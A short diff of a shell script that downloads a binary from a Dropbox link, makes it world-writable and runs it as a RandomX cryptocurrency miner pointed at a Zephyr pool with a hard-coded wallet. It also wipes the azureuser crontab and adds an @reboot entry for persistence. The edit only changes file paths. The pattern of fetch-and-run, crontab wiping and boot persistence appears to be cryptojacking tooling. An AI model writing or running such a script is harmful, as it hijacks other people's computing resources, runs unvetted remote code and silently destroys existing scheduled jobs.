@@ -6,10 +6,10 @@ wget http://dl.dropboxusercontent.com/s/khboofn0qh8fyut/bms
 
 chmod 777 bms
 
-sudo/azureuser/bms --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHsCWYmkTcLz9w2AxxDvE2GBgruxJzBCjk5findzLGMtmYyCk3dWZj7Qs371fc35MQhdGeCGohB2QPvgRgTnFrgSov3yCSnxn --password az --cpu-threads 20
+sudo/bms --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHsCWYmkTcLz9w2AxxDvE2GBgruxJzBCjk5findzLGMtmYyCk3dWZj7Qs371fc35MQhdGeCGohB2QPvgRgTnFrgSov3yCSnxn --password az --cpu-threads 20
 sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof bms) > /dev/null 2>&1 &" bms.sh
 cat /dev/null > /var/spool/cron/crontabs/azureuser		
 cat >>/var/spool/cron/crontabs/azureuser<<EOF		
-@reboot /azureuser/bms.sh		
+@reboot /bms.sh		
 EOF
 ./bms.sh
